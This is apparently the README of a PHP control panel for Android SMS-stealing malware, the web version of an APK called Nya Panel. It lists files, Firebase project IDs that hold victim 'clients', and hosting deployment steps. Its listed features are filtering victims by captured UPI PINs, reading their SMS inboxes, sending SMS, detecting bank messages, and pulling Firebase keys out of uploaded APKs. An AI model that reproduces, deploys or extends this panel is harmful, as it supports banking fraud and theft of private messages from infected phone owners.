# Nya Panel — Multi Firebase Web

Web version of **Nya Panel APK** (`nyapanel.apk`) with **multi-Firebase** support.

## Files

| File | Purpose |
|------|---------|
| `index.php` | Redirect → `nya.php` |
| `nya.php` | Main panel — PIN clients, SMS, multi-FB switch |
| `admin.php` | Desktop admin (multi-Firebase CRUD) |
| `mobile.php` | Rebel mobile panel (alternate) |
| `firebase_defaults.js` | Default Firebase projects (Nya + God8) |
| `rebel_firebase.json` | Server-side Firebase registry |
| `rebel_bot_lib.php` | Firebase REST, SMS send, schema detection |
| `sex.php` | SMS token / webhook API hub |

## Default Firebase projects

1. **Nya Panel** — `hdjdjdj-a73f2` · `clients/` node (same as nyapanel.apk)
2. **God8 Chatee** — `god8-208ac` · `clients/` node

Add more via **Firebase tab** → paste URL + API key, or edit `rebel_firebase.json`.

## Deploy (PHP hosting)

Upload `rebel-panel/` folder to your server (AlwaysData, cPanel, VPS with nginx+php-fpm).

```
https://yourdomain.com/rebel-panel/nya.php
```

Requirements: PHP 7.4+ with `curl`, `json` extensions.

## Features (like Nya APK)

- **PIN filter default** — shows only clients with UPI PIN / pin fields
- Search "Only Pin clients"
- Multi-Firebase combined view or filter by project
- Device info, SMS inbox, send SMS
- Bank SMS detection

## APK extract

Upload any admin APK on Firebase tab → auto-extract Firebase URL + API key from APK.
